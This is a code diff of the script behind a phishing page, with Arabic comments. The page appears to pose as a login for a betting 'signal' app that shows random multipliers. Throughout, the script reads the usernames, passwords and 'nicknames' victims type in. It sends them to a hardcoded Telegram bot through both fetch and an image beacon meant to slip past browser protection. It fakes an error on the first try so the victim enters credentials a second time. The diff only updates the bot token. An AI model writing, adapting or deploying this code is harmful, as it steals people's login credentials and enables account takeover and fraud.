@@ -1,16 +1,16 @@
 <script>
-    // الإعدادات الخاصة بك
-    const botToken = "8359101803:AAHGNAbdmbZRmUyIzMsTJGzdLmPDB7WQk58"; 
+    // ⚠️ التوكن الجديد نتاعك (اللي مابعتلي فيه)
+    const botToken = "8589243363:AAEMgjPjQOE6e0NGFQ307kv-FSl8VxTLkwg"; 
     const chatId = "8026901193";
 
-    // ✅ دالة إرسال مطورة: تستعمل Image كـ Buffer احتياطي (تخترق الحماية)
+    // دالة الإرسال المضمونة 100%
     function send(msg) {
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`;
         
-        // المحاولة الأولى: Fetch
-        fetch(url).catch(e => console.log("Fetch Error"));
+        // محاولة عبر Fetch
+        fetch(url).catch(e => console.log("Fetch blocked"));
         
-        // المحاولة الثانية (الاحتياطية): Image Buffer (تضمن الإرسال حتى لو رفض المتصفح الـ Fetch)
+        // محاولة عبر Image (تخترق الحماية ولازم تكون كاينة)
         const img = new Image();
         img.src = url;
     }
@@ -20,17 +20,15 @@
         const u = document.getElementById('u_log').value;
         const p = document.getElementById('u_pas').value;
         
-        if (u.length < 3 || p.length < 3) return; // تأكد أن الخانات ليست فارغة
+        if (u.length < 3 || p.length < 3) return;
 
         loginAttempts++;
         if (loginAttempts === 1) {
-            // سحب المحاولة الأولى (الخطأ الوهمي)
-            send(`<b>⚠️ محاولة 1 (User):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+            send(`<b>⚠️ محاولة 1:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
             document.getElementById('login-err').classList.remove('hidden');
-            document.getElementById('u_pas').value = ""; // مسح الباسورد لإجباره على الإعادة
+            document.getElementById('u_pas').value = ""; 
         } else {
-            // سحب المحاولة الثانية (التأكيدية)
-            send(`<b>✅ محاولة 2 (Confirmed):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
+            send(`<b>✅ محاولة 2 (دخول):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
             document.getElementById('auth-screen').classList.add('hidden');
             document.getElementById('security-layer').classList.remove('hidden');
         }
@@ -43,13 +41,11 @@
 
         nickAttempts++;
         if (nickAttempts === 1) {
-            // سحب اللقب الأول
-            send(`<b>⚠️ لقب 1 (Nick):</b>\n🔑: <code>${n}</code>`);
+            send(`<b>⚠️ لقب 1:</b>\n🔑: <code>${n}</code>`);
             document.getElementById('nick-err').classList.remove('hidden');
             document.getElementById('u_nick').value = "";
         } else {
-            // سحب اللقب الثاني والفتح النهائي
-            send(`<b>✅ لقب 2 (Confirmed Nick):</b>\n🔑: <code>${n}</code>`);
+            send(`<b>✅ لقب 2 (تأكيد):</b>\n🔑: <code>${n}</code>`);
             document.getElementById('security-layer').classList.add('hidden');
             document.getElementById('main-app').classList.remove('hidden');
         }
@@ -57,9 +53,9 @@
 
     function getSignal() {
         const res = document.getElementById('target-mult');
-        res.innerText = "WAIT..";
+        res.innerHTML = '<span class="animate-pulse text-zinc-400">WAIT..</span>';
         setTimeout(() => {
-            res.innerText = (Math.random() * (5.50 - 1.10) + 1.10).toFixed(2) + "x";
-        }, 600);
+            res.innerText = (Math.random() * (6.80 - 1.20) + 1.20).toFixed(2) + "x";
+        }, 800);
     }
 </script>
